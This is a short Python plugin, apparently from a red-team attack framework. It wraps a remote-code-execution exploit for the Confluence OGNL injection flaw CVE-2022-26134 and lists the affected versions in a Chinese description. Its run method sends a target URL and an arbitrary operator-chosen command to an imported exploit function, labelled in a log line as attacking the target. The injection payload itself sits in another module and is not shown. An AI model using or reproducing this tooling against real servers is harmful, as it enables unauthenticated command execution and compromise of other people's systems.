from plugins.lib.confluence.main import exploit
from plugins.plugin import Plugin


class RTPlugin(Plugin):
    def __init__(self):
        super().__init__()
        self.name = "Confluence_OGNL"
        self.type = self.URL_CMD
        self.desc = "CVE-2022-26134，远程攻击者在未经身份验证的情况下，可构造OGNL表达式进行注入,影响范围:<br>Confluence Server and Data Center >= " \
                    "1.3.0<br>Confluence Server and Data Center < 7.4.17<br>Confluence Server and Data Center < " \
                    "7.13.7<br>Confluence Server and Data Center < 7.14.3<br>Confluence Server and Data Center < " \
                    "7.15.2<br>Confluence Server and Data Center < 7.16.4<br>Confluence Server and Data Center < " \
                    "7.17.4<br>Confluence Server and Data Center < 7.18.1 "

    def _run(self):
        self.log(f"正在攻击{self.url}")
        self.log(f"cmd:{self.cmd}")
        self.log(exploit(self.url, self.cmd))
